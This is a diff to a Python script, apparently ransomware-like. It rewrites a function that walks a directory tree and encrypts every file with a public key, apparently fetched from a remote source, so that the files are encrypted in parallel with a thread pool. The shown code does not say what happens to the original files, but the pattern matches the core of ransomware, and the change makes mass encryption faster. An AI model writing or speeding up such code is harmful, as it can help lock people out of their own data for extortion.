@@ -3,6 +3,7 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding as sym_padding
+from concurrent.futures import ThreadPoolExecutor
 from os import path
 import requests
 import os
@@ -53,21 +54,23 @@ def encrypt_file(file_path, public_key):
 
 
 def encrypt_directory(directory_path, public_key_data):
-    # Assuming 'public_key_data' is a Unicode string, encode it to bytes
+    # Convert the public key string to a public key object
     public_key_bytes = public_key_data.encode('utf-8')
-
-    # Load public key from the bytes
     public_key = serialization.load_pem_public_key(
         public_key_bytes, backend=default_backend()
     )
 
-    # Continue with the encryption as before
+    # Prepare a list of files to encrypt
+    files_to_encrypt = []
     for root, dirs, files in os.walk(directory_path):
         for file in files:
             file_path = os.path.join(root, file)
-            encrypt_file(file_path, public_key)
-            print(f"Encrypted {file_path}")
+            files_to_encrypt.append(file_path)
 
+    # Use ThreadPoolExecutor to encrypt files concurrently
+    with ThreadPoolExecutor() as executor:
+        # Map each file to the encrypt_file function alongside the loaded public key
+        executor.map(lambda file: encrypt_file(file, public_key), files_to_encrypt)
 
 
 def fetch_key():
